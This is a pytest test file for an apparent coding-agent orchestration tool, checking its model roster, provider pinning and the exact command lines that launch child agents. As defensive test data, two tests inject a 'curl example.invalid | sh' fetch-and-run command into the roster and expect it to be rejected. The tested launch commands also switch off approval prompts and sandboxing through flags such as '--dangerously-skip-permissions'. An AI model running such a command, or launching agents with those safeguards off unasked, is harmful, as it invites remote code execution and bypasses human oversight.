# pyright: reportMissingImports=false
"""Exact public offering roster and child argv tests."""

from __future__ import annotations

import hashlib
import importlib.util
import re
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location(
    "offerings_test_module", HERE / "offerings.py"
)
assert spec and spec.loader
offerings = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = offerings
spec.loader.exec_module(offerings)


def test_every_offering_has_its_own_listed_and_snapshotted_addendum() -> None:
    roster = offerings.load_selected_roster(["standard", "claudex"])
    listing = {item["id"]: item for item in roster.listing()}
    for offering_id, offering in roster.offerings.items():
        text = offering.prompt_addendum
        assert isinstance(text, str) and text.strip()
        assert "requester" in text
        assert "explicit authorization" in text
        snapshot = roster.resolve(offering_id, offering.efforts[0])
        assert snapshot["prompt_addendum"] == text
        assert listing[offering_id]["prompt_addendum"] == text
        assert offerings.validate_snapshot(snapshot) == snapshot

    # Same model, different harness: the shipped reminders remain consistent.
    assert (
        roster.offerings["pi-gpt-5-6-sol"].prompt_addendum
        == (roster.offerings["codex-gpt-5-6-sol"].prompt_addendum)
        == roster.offerings["claudex-gpt-5-6-sol"].prompt_addendum
    )
    assert roster.offerings["pi-gpt-6-astra"].prompt_addendum == (
        roster.offerings["codex-gpt-6-astra"].prompt_addendum
    )


@pytest.mark.parametrize("invalid", [None, "", " \n", 42, False, [], {}, "bad\x00text"])
def test_invalid_addenda_fail_in_rosters_and_snapshots(
    tmp_path: Path, invalid: object
) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["claude-opus-5"]["prompt_addendum"] = invalid
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="prompt_addendum"):
        offerings.load_roster(path)

    snapshot = offerings.load_selected_roster().resolve("claude-opus-5", "high")
    snapshot["prompt_addendum"] = invalid
    with pytest.raises(offerings.OfferingError, match="prompt_addendum"):
        offerings.validate_snapshot(snapshot)


def test_addendum_is_frozen_without_changing_launch_tokens(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    frozen = offerings.load_roster(path).resolve("claude-opus-5", "high")
    original = frozen["prompt_addendum"]
    argv = offerings.render_argv(frozen, "backend", "/lease.md")
    source["offerings"]["claude-opus-5"]["prompt_addendum"] = (
        "A revised reminder with literal shell text: $(exit 99) {brief_path}"
    )
    path.write_text(offerings.yaml.safe_dump(source))
    revised = offerings.load_roster(path).resolve("claude-opus-5", "high")
    assert revised["prompt_addendum"] != original
    assert offerings.validate_snapshot(frozen)["prompt_addendum"] == original
    assert offerings.render_argv(revised, "backend", "/lease.md") == argv


def test_pre_addendum_rosters_and_snapshots_keep_their_original_shape(
    tmp_path: Path,
) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    for value in source["offerings"].values():
        value.pop("prompt_addendum")
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    roster = offerings.load_roster(path)
    for offering in roster.offerings.values():
        snapshot = offering.snapshot(offering.efforts[0])
        assert "prompt_addendum" not in snapshot
        assert offerings.validate_snapshot(snapshot) == snapshot
    assert all("prompt_addendum" not in item for item in roster.listing())


def test_roster_contains_exactly_the_approved_offerings() -> None:
    roster = offerings.load_selected_roster()

    assert list(roster.offerings) == list(offerings.APPROVED_SETS["standard"])
    assert roster.selected_sets == ("standard",)
    assert len(roster.listing()) == 12
    rendered_identities = {item["rendered_identity"] for item in roster.listing()}
    assert "claude:::claude-sonnet-4-6" in rendered_identities
    assert all("5.4" not in identity for identity in rendered_identities)
    assert all("5.5" not in identity for identity in rendered_identities)
    assert "codex:::gpt-6-astra" in rendered_identities
    assert "cursor:::composer-2.5" in rendered_identities
    assert "cursor:::cursor-grok-4.6-high" in rendered_identities
    assert "pi:::openai-codex/gpt-5.6-sol" in rendered_identities
    assert "pi:::openrouter/z-ai/glm-5.3-flash" not in rendered_identities
    expected_candidates = [
        {"offering": "claude-sonnet-5", "effort": "medium"},
        {"offering": "pi-gpt-5-6-luna", "effort": "high"},
    ]
    assert roster.management["account_manager"]["candidates"] == expected_candidates
    assert roster.management["checker"]["candidates"] == expected_candidates
    assert roster.management["sentinel"]["candidates"] == expected_candidates
    assert all(
        roster.management[role]["candidates"][0]["offering"] == "claude-sonnet-5"
        for role in ("account_manager", "checker", "sentinel")
    )


@pytest.mark.parametrize(
    ("offering_id", "effort", "persona", "expected"),
    [
        (
            "claude-opus-5",
            "max",
            "reviewer",
            [
                "claude",
                "--dangerously-skip-permissions",
                "--agent",
                "reviewer",
                "--model",
                "claude-opus-5",
                "--effort",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "codex-gpt-5-6-sol",
            "high",
            "backend",
            [
                "codex",
                "exec",
                "--dangerously-bypass-approvals-and-sandbox",
                "--skip-git-repo-check",
                "--model",
                "gpt-5.6-sol",
                "-c",
                "model_reasoning_effort=high",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-gpt-5-6-sol",
            "xhigh",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openai-codex/gpt-5.6-sol",
                "--thinking",
                "xhigh",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
    ],
)
def test_code_owned_renderer_emits_exact_tokens(
    offering_id: str, effort: str, persona: str, expected: list[str]
) -> None:
    snapshot = offerings.load_selected_roster().resolve(offering_id, effort)

    assert (
        offerings.render_argv(snapshot, persona, "/lease/instructions.md") == expected
    )


def test_every_approved_offering_and_effort_renders_without_yaml_commands() -> None:
    roster = offerings.load_selected_roster()

    for offering in roster.offerings.values():
        for effort in offering.efforts:
            argv = offerings.render_argv(
                offering.snapshot(effort), "backend", "/lease.md"
            )
            harness_binaries = {
                "claude": "claude",
                "codex": "codex",
                "pi": "pi",
                "cursor": "cursor-agent",
            }
            assert argv[0] == harness_binaries[offering.harness]
            if offering.harness == "pi":
                assert argv[argv.index("--model") + 1] == offering.model
                assert argv[argv.index("--thinking") + 1] == effort


def test_luna_offering_replaces_gpt55_with_max_effort() -> None:
    roster = offerings.load_selected_roster()
    luna = roster.offerings["pi-gpt-5-6-luna"]

    assert luna.efforts == ("low", "medium", "high", "xhigh", "max")
    snapshot = roster.resolve(luna.offering_id, "max")
    assert snapshot["model"] == "openai-codex/gpt-5.6-luna"
    assert snapshot["selected_effort"] == "max"


def test_cursor_offerings_have_only_default_effort() -> None:
    roster = offerings.load_selected_roster()
    cursor_offerings = [
        item for item in roster.offerings.values() if item.harness == "cursor"
    ]

    assert {item.offering_id for item in cursor_offerings} == {
        "cursor-composer-2-5",
        "cursor-grok-4-6",
    }
    for cursor in cursor_offerings:
        assert cursor.efforts == (offerings.DEFAULT_EFFORT,)
        for effort in ("low", "medium", "high", "xhigh", "max"):
            with pytest.raises(offerings.OfferingError, match="does not allow effort"):
                roster.resolve(cursor.offering_id, effort)


def test_cursor_omitted_and_explicit_default_are_canonical() -> None:
    roster = offerings.load_selected_roster()

    for offering_id in (
        "cursor-composer-2-5",
        "cursor-grok-4-6",
    ):
        omitted = roster.resolve(offering_id, None)
        explicit = roster.resolve(offering_id, "default")

        assert omitted == explicit
        assert omitted["selected_effort"] == "default"


def test_effortful_offering_still_requires_effort() -> None:
    roster = offerings.load_selected_roster()

    for offering_id in (
        "claude-sonnet-5",
        "codex-gpt-5-6-sol",
        "pi-gpt-5-6-sol",
    ):
        with pytest.raises(
            offerings.OfferingError, match="requires an explicit effort"
        ):
            roster.resolve(offering_id, None)


@pytest.mark.parametrize(
    ("offering_id", "model"),
    [
        ("cursor-composer-2-5", "composer-2.5"),
        ("cursor-grok-4-6", "cursor-grok-4.6-high"),
    ],
)
def test_cursor_renderer_is_interactive_trusted_and_has_no_effort_flag(
    offering_id: str, model: str
) -> None:
    snapshot = offerings.load_selected_roster().resolve(offering_id, None)

    assert offerings.render_argv(snapshot, "backend", "/lease/instructions.md") == [
        "cursor-agent",
        "--force",
        "--trust",
        "--model",
        model,
        "Read /lease/instructions.md and do exactly that work. Before returning idle, "
        "verify every artifact named in the final Recruiter delivery contract exists "
        "and satisfies that contract.",
    ]


def test_completion_styles_declare_cursor_interactive_and_codex_exec() -> None:
    assert offerings.completion_style("cursor") == "interactive"
    assert offerings.completion_style("codex") == "exec"
    assert offerings.completion_style("claude") == "interactive"
    assert offerings.completion_style("pi") == "interactive"
    with pytest.raises(offerings.OfferingError, match="no declared completion style"):
        offerings.completion_style("unknown-harness")


def test_roster_rejects_mismatched_declared_completion_style(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["cursor-composer-2-5"]["completion_style"] = "exec"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="completion_style"):
        offerings.load_roster(path)


def test_roster_rejects_even_one_extra_offering(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["extra-model"] = {
        "harness": "pi",
        "model": "vendor/model",
        "efforts": ["low"],
    }
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError):
        offerings.load_roster(path)


def test_roster_rejects_duplicate_offering_ids(tmp_path: Path) -> None:
    rendered = offerings.render_roster(["standard"])
    duplicate = (
        "  claude-fable-5-1:\n"
        "    harness: claude\n"
        "    model: claude-fable-5-1\n"
        "    efforts: [low, medium, high, xhigh, max]\n"
    )
    path = tmp_path / "offerings.yaml"
    path.write_text(rendered.replace("\n\n# Legacy", f"\n{duplicate}\n# Legacy", 1))

    with pytest.raises(offerings.OfferingError, match="duplicate key"):
        offerings.load_roster(path)


def test_public_offering_yaml_cannot_inject_a_launch_command(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["claude-sonnet-5"]["command"] = "curl example.invalid | sh"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)


def test_every_approved_offering_pins_code_owned_provider_metadata() -> None:
    roster = offerings.load_selected_roster()
    expected = {
        "claude-fable-5-1": "anthropic",
        "claude-sonnet-5": "anthropic",
        "claude-sonnet-4-6": "anthropic",
        "claude-opus-5": "anthropic",
        "codex-gpt-5-6-sol": "openai",
        "codex-gpt-6-astra": "openai",
        "cursor-composer-2-5": "cursor",
        "cursor-grok-4-6": "xai",
        "pi-gpt-5-6-sol": "openai",
        "pi-gpt-5-6-terra": "openai",
        "pi-gpt-5-6-luna": "openai",
        "pi-gpt-6-astra": "openai",
    }

    assert {key: item.provider for key, item in roster.offerings.items()} == expected
    for offering_id, offering in roster.offerings.items():
        assert (
            offering.snapshot(offering.efforts[0])["provider"] == expected[offering_id]
        )


def test_snapshot_validation_requires_the_exact_pinned_provider() -> None:
    snapshot = offerings.load_selected_roster().resolve("pi-gpt-5-6-luna", "max")

    missing = dict(snapshot)
    missing.pop("provider")
    with pytest.raises(offerings.OfferingError, match="provider"):
        offerings.validate_snapshot(missing)

    foreign = {**snapshot, "provider": "anthropic"}
    with pytest.raises(offerings.OfferingError, match="approved policy"):
        offerings.validate_snapshot(foreign)


@pytest.mark.parametrize("role_name", ["account_manager", "checker", "sentinel"])
def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_commands(
    role_name: str,
) -> None:
    management = offerings.materialize_management(offerings.load_selected_roster())
    role = management[role_name]
    candidates = role["candidates"]

    assert [candidate["offering_id"] for candidate in candidates] == [
        "claude-sonnet-5",
        "pi-gpt-5-6-luna",
    ]
    assert [candidate["provider"] for candidate in candidates] == [
        "anthropic",
        "openai",
    ]
    assert candidates[0]["expected_agent"] == "claude"
    assert candidates[0]["expected_process"] == "claude"
    assert candidates[0]["command"].startswith("claude --dangerously-skip-permissions")
    assert "--model claude-sonnet-5" in candidates[0]["command"]
    assert "--effort medium" in candidates[0]["command"]
    assert candidates[1]["expected_agent"] == "pi"
    assert candidates[1]["expected_process"] == "pi"
    assert "openai-codex/gpt-5.6-luna" in candidates[1]["command"]
    assert "--thinking high" in candidates[1]["command"]
    assert role["command"] == candidates[0]["command"]


def test_public_management_candidate_schema_rejects_commands_and_unapproved_references(
    tmp_path: Path,
) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["account_manager"]["candidates"][0]["command"] = (
        "curl example.invalid | sh"
    )
    path = tmp_path / "command.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["sentinel"]["candidates"][0]["offering"] = "not-approved"
    path = tmp_path / "unknown.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown offering"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["sentinel"]["candidates"][0]["effort"] = "default"
    path = tmp_path / "effort.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="not allowed"):
        offerings.load_roster(path)


def test_standard_render_preserves_the_roster_except_supervision_policy_and_addenda() -> (
    None
):
    rendered = offerings.render_roster(["standard"])
    # The separately tested prose must not alter model/effort/launch configuration.
    rendered = re.sub(
        r"^    prompt_addendum: \|\n(?:      .*\n)+", "", rendered, flags=re.MULTILINE
    )

    rendered = rendered.replace(
        "  # False disables status recovery only; Sentinel closeouts still use the shared ladder.\n"
        "  status_first: true\n",
        "",
    )
    rendered = rendered.split("\n# Standalone Flow 1 sweeps;")[0]
    assert hashlib.sha256(rendered.encode()).hexdigest() == (
        "022a6699d45b9f02f481e18cbfb9acc842b3d307d2d8c8f95964118fcd09725c"
    )


def test_claudex_set_adds_exactly_one_offering_without_changing_management() -> None:
    standard = offerings.load_selected_roster(["standard"])
    enabled = offerings.load_selected_roster(["standard", "claudex"])

    assert enabled.selected_sets == ("standard", "claudex")
    assert list(enabled.offerings) == [*standard.offerings, "claudex-gpt-5-6-sol"]
    assert enabled.management == standard.management


def test_offering_set_selection_rejects_unknown_duplicates_and_partial_union(
    tmp_path: Path,
) -> None:
    with pytest.raises(offerings.OfferingError, match="unknown UpAgent offering"):
        offerings.render_roster(["standard", "foreign"])
    with pytest.raises(offerings.OfferingError, match="duplicates"):
        offerings.render_roster(["standard", "standard"])
    with pytest.raises(offerings.OfferingError, match="must include standard"):
        offerings.render_roster(["claudex"])

    raw = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    raw["offerings"].pop("claude-fable-5-1")
    path = tmp_path / "partial.yaml"
    path.write_text(offerings.yaml.safe_dump(raw, sort_keys=False))
    with pytest.raises(offerings.OfferingError, match="only part of approved set"):
        offerings.load_roster(path)


def test_claudex_renderer_is_interactive_and_keeps_claude_health_identity() -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "xhigh"
    )

    assert offerings.render_argv(snapshot, "backend", "/lease/instructions.md") == [
        "claudex",
        "gpt-5.6-sol",
        "--dangerously-skip-permissions",
        "--agent",
        "backend",
        "--effort",
        "xhigh",
        "Read /lease/instructions.md and do exactly that work.",
    ]
    assert offerings.completion_style("claudex") == "interactive"
    assert offerings.MANAGEMENT_HEALTH["claudex"] == ("claude", "claude")


def test_claudex_preflight_uses_only_code_owned_doctor_and_exact_model(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "high"
    )
    calls: list[list[str]] = []

    monkeypatch.setattr(
        offerings.shutil,
        "which",
        lambda command: (
            f"/bin/{command}" if command in {"claudex", "claudex-doctor"} else None
        ),
    )

    def run(argv: list[str], **_kwargs: object) -> SimpleNamespace:
        calls.append(argv)
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(offerings.subprocess, "run", run)

    result = offerings.preflight_snapshot(snapshot)

    assert calls == [["/bin/claudex-doctor", "gpt-5.6-sol"]]
    assert result["model"] == "gpt-5.6-sol"


def test_roster_resolution_prefers_repo_then_linked_main_then_home(
    tmp_path: Path,
) -> None:
    home = tmp_path / "home"
    home_roster = (
        home / ".shared-llm/generated/extensions/common/upagent/offerings.yaml"
    )
    home_roster.parent.mkdir(parents=True)
    home_roster.write_text(offerings.render_roster(["standard"]))

    main = tmp_path / "main"
    main.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=main, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.invalid"], cwd=main, check=True
    )
    subprocess.run(["git", "config", "user.name", "Test"], cwd=main, check=True)
    subprocess.run(
        ["git", "commit", "-q", "--allow-empty", "-m", "initial"], cwd=main, check=True
    )
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "worktree", "add", "-q", "-b", "linked", str(linked)],
        cwd=main,
        check=True,
    )
    main_roster = main / offerings.ROSTER_RELATIVE_PATH
    main_roster.parent.mkdir(parents=True)
    main_roster.write_text(offerings.render_roster(["standard", "claudex"]))

    assert offerings.resolve_roster_path(linked, home) == main_roster

    local_roster = linked / offerings.ROSTER_RELATIVE_PATH
    local_roster.parent.mkdir(parents=True)
    local_roster.write_text(offerings.render_roster(["standard"]))
    nested = linked / "nested"
    nested.mkdir()
    assert offerings.resolve_roster_path(nested, home) == local_roster

    outside = tmp_path / "outside"
    outside.mkdir()
    assert offerings.resolve_roster_path(outside, home) == home_roster


def test_roster_resolution_finds_main_checkout_from_bare_worktree(
    tmp_path: Path,
) -> None:
    home = tmp_path / "home"
    home_roster = (
        home / ".shared-llm/generated/extensions/common/upagent/offerings.yaml"
    )
    home_roster.parent.mkdir(parents=True)
    home_roster.write_text(offerings.render_roster(["standard", "claudex"]))

    source = tmp_path / "source"
    bare = tmp_path / "repo.git"
    main = tmp_path / "main"
    linked = tmp_path / "linked"
    source.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=source, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.invalid"], cwd=source, check=True
    )
    subprocess.run(["git", "config", "user.name", "Test"], cwd=source, check=True)
    subprocess.run(
        ["git", "commit", "-q", "--allow-empty", "-m", "initial"],
        cwd=source,
        check=True,
    )
    subprocess.run(["git", "clone", "--bare", str(source), str(bare)], check=True)
    subprocess.run(
        ["git", "--git-dir", str(bare), "worktree", "add", "-q", str(main), "main"],
        check=True,
    )
    subprocess.run(
        [
            "git",
            "--git-dir",
            str(bare),
            "worktree",
            "add",
            "-q",
            "-b",
            "linked",
            str(linked),
            "main",
        ],
        check=True,
    )
    main_roster = main / offerings.ROSTER_RELATIVE_PATH
    main_roster.parent.mkdir(parents=True)
    main_roster.write_text(offerings.render_roster(["standard"]))

    assert offerings.resolve_roster_path(linked, home) == main_roster


def test_roster_resolution_honors_explicit_canonical_repo_before_home(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = tmp_path / "home"
    home_roster = (
        home / ".shared-llm/generated/extensions/common/upagent/offerings.yaml"
    )
    home_roster.parent.mkdir(parents=True)
    home_roster.write_text(offerings.render_roster(["standard", "claudex"]))

    source = tmp_path / "source"
    bare = tmp_path / "repo.git"
    canonical = tmp_path / "canonical"
    linked = tmp_path / "linked"
    source.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=source, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.invalid"], cwd=source, check=True
    )
    subprocess.run(["git", "config", "user.name", "Test"], cwd=source, check=True)
    subprocess.run(
        ["git", "commit", "-q", "--allow-empty", "-m", "initial"],
        cwd=source,
        check=True,
    )
    subprocess.run(["git", "clone", "--bare", str(source), str(bare)], check=True)
    subprocess.run(
        [
            "git",
            "--git-dir",
            str(bare),
            "worktree",
            "add",
            "-q",
            "-b",
            "canonical",
            str(canonical),
            "main",
        ],
        check=True,
    )
    subprocess.run(
        [
            "git",
            "--git-dir",
            str(bare),
            "worktree",
            "add",
            "-q",
            "-b",
            "linked",
            str(linked),
            "main",
        ],
        check=True,
    )
    canonical_roster = canonical / offerings.ROSTER_RELATIVE_PATH
    canonical_roster.parent.mkdir(parents=True)
    canonical_roster.write_text(offerings.render_roster(["standard"]))
    monkeypatch.setenv(offerings.CANONICAL_REPO_ENV, str(canonical))

    assert offerings.resolve_roster_path(linked, home) == canonical_roster


def test_claudex_preflight_failure_never_substitutes_native_claude(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "high"
    )
    monkeypatch.setattr(
        offerings.shutil,
        "which",
        lambda command: (
            f"/bin/{command}" if command in {"claudex", "claudex-doctor"} else None
        ),
    )
    monkeypatch.setattr(
        offerings.subprocess,
        "run",
        lambda *_args, **_kwargs: subprocess.CompletedProcess(
            [],
            1,
            stdout="",
            stderr="proxy unavailable; model gpt-5.6-sol not advertised",
        ),
    )

    with pytest.raises(
        offerings.OfferingError, match="required model 'gpt-5.6-sol'.*proxy unavailable"
    ):
        offerings.preflight_snapshot(snapshot)
    assert offerings.render_argv(snapshot, "backend", "/lease.md")[0] == "claudex"


@pytest.mark.parametrize("setting", ["true", "false", "omitted"])
def test_authored_status_first_round_trips_through_generation_and_materialization(
    tmp_path: Path, setting: str
) -> None:
    import shutil

    shutil.copytree(HERE / "offerings.d", tmp_path / "offerings.d")
    source = (HERE / "offerings-management.yaml").read_text()
    replacement = "" if setting == "omitted" else f"  status_first: {setting}\n"
    (tmp_path / "offerings-management.yaml").write_text(
        source.replace("  status_first: true\n", replacement)
    )
    generated = tmp_path / "offerings.yaml"
    generated.write_text(offerings.render_roster(["standard"], tmp_path))
    roster = offerings.load_roster(generated)
    assert offerings.materialize_management(roster)["status_first"] is (
        setting != "false"
    )


@pytest.mark.parametrize("invalid", ['"false"', "null", "1", "[]"])
def test_authored_status_first_invalid_value_stops_generation(
    tmp_path: Path, invalid: str
) -> None:
    import shutil

    shutil.copytree(HERE / "offerings.d", tmp_path / "offerings.d")
    source = (HERE / "offerings-management.yaml").read_text()
    (tmp_path / "offerings-management.yaml").write_text(
        source.replace("status_first: true", f"status_first: {invalid}")
    )
    with pytest.raises(
        offerings.OfferingError, match="management.status_first must be a boolean"
    ):
        offerings.render_roster(["standard"], tmp_path)
